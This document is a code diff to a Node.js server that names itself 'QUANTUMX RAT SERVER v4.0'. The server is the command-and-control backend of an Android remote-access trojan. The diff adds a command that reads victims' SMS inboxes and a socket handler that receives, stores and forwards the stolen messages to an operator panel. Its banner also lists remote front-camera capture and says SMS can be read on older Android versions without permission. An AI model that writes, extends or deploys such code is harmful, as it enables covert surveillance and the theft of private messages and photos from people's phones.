@@ -36,6 +36,9 @@ let commandResults = new Map();
 // Camera sessions tracking
 let cameraSessions = new Map(); // deviceId -> { active: boolean, socketId: string }
 
+// SMS storage (opsional - kalo mau nyimpen SMS di server)
+let smsStorage = new Map(); // deviceId -> array of SMS
+
 // ========== AUTH ==========
 const JWT_SECRET = 'quantumx-super-secret-key-2024';
 
@@ -151,6 +154,8 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
         console.log(`📷 [CAMERA] CAPTURING -> ${deviceName} (${deviceId})`);
     } else if (command === 'vibrate') {
         console.log(`📳 [VIBRATE] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
+    } else if (command === 'get_sms') {
+        console.log(`📨 [SMS] REQUESTING SMS -> ${deviceName} (${deviceId}) | LIMIT: ${params?.limit || 50}`);
     }
     
     res.json({ success: true, commandId, message: 'Command sent' });
@@ -199,6 +204,12 @@ app.post('/api/device/command/result', (req, res) => {
                 console.log(`✅ [VIBRATE] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
             } else {
                 console.log(`❌ [VIBRATE] FAILED -> ${deviceName}`);
+            }
+        } else if (deviceCommands[commandIndex].command === 'get_sms') {
+            if (status === 'completed') {
+                console.log(`✅ [SMS] SUCCESS -> ${deviceName} | ${result?.count || 0} MESSAGES`);
+            } else {
+                console.log(`❌ [SMS] FAILED -> ${deviceName}`);
             }
         }
     }
@@ -307,6 +318,37 @@ io.on('connection', (socket) => {
         }
     });
     
+    // ===== SMS DATA DARI APK =====
+    socket.on('sms-data', (data) => {
+        const { deviceId, messages, commandId } = data;
+        
+        console.log(`📨 [SMS] RECEIVED from ${deviceId}: ${messages?.length || 0} messages`);
+        
+        // Simpan di storage (opsional)
+        if (messages && messages.length > 0) {
+            smsStorage.set(deviceId, messages);
+        }
+        
+        // Update last seen
+        if (devices.has(deviceId)) {
+            const device = devices.get(deviceId);
+            device.lastSeen = new Date().toISOString();
+            devices.set(deviceId, device);
+        }
+        
+        // Kirim ke panel
+        io.emit('sms-result', {
+            deviceId,
+            messages: messages || [],
+            commandId,
+            timestamp: Date.now()
+        });
+        
+        // Log sukses
+        const deviceName = devices.get(deviceId)?.deviceName || deviceId;
+        console.log(`✅ [SMS] FORWARDED to panel: ${deviceName} - ${messages?.length || 0} messages`);
+    });
+    
     // ===== CAMERA FRAME DARI APK =====
     socket.on('camera-frame', (data) => {
         const { deviceId, imageData, timestamp } = data;
@@ -383,7 +425,8 @@ app.get('/api/stats', authenticateToken, (req, res) => {
         onlineDevices: onlineCount,
         totalCommands: commandResults.size,
         pendingCommands: Array.from(commands.values()).flat().filter(c => c.status === 'pending').length,
-        activeCameras: cameraSessions.size
+        activeCameras: cameraSessions.size,
+        totalSmsStored: smsStorage.size
     });
 });
 
@@ -391,21 +434,32 @@ app.get('/api/stats', authenticateToken, (req, res) => {
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
-╔═══════════════════════════════════════════════════╗
-║    QUANTUMX RAT SERVER v3.3                       ║
-║    RUNNING ON PORT: ${PORT}                                    ║
-║    WEBSOCKET: ws://localhost:${PORT}                           ║
-║    API: http://localhost:${PORT}/api                          ║
-║                                                     ║
-║    LOG FORMAT:                                       ║
-║    📸 [FLASH] SENDING -> Device (2s)                ║
-║    ✅ [FLASH] SUCCESS -> Device | DURATION: 2s      ║
-║    📳 [VIBRATE] SENDING -> Device (2s)              ║
-║    ✅ [VIBRATE] SUCCESS -> Device | DURATION: 2s    ║
-║    📷 [CAMERA] CAPTURING -> Device                   ║
-║    ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN       ║
-║    📱 [DEVICE] ONLINE -> Device | NETWORK: WiFi SSID ║
-║    💓 [HEARTBEAT] Device - 82% - NETWORK: 4G        ║
-╚═══════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════╗
+║           QUANTUMX RAT SERVER v4.0 - FINAL                   ║
+╠══════════════════════════════════════════════════════════════╣
+║  RUNNING ON PORT: ${PORT}                                                ║
+║  WEBSOCKET: ws://localhost:${PORT}                                       ║
+║  API: http://localhost:${PORT}/api                                      ║
+╠══════════════════════════════════════════════════════════════╣
+║                     FITUR TERSEDIA                            ║
+╠══════════════════════════════════════════════════════════════╣
+║  📸 FLASH  - Kontrol LED flash                                ║
+║  📳 VIBRATE - Getar perangkat                                 ║
+║  📷 CAMERA - Ambil foto kamera depan                           ║
+║  📨 SMS    - Baca inbox SMS (Android <6.0 tanpa izin)         ║
+╠══════════════════════════════════════════════════════════════╣
+║                     LOG FORMAT                                 ║
+╠══════════════════════════════════════════════════════════════╣
+║  📸 [FLASH] SENDING -> Device (2s)                            ║
+║  ✅ [FLASH] SUCCESS -> Device | DURATION: 2s                  ║
+║  📳 [VIBRATE] SENDING -> Device (2s)                          ║
+║  ✅ [VIBRATE] SUCCESS -> Device | DURATION: 2s                ║
+║  📷 [CAMERA] CAPTURING -> Device                               ║
+║  ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN                   ║
+║  📨 [SMS] REQUESTING SMS -> Device | LIMIT: 50                 ║
+║  ✅ [SMS] SUCCESS -> Device | 15 MESSAGES                      ║
+║  📱 [DEVICE] ONLINE -> Device | NETWORK: WiFi SSID             ║
+║  💓 [HEARTBEAT] Device - 82% - NETWORK: 4G                     ║
+╚══════════════════════════════════════════════════════════════╝
     `);
 });
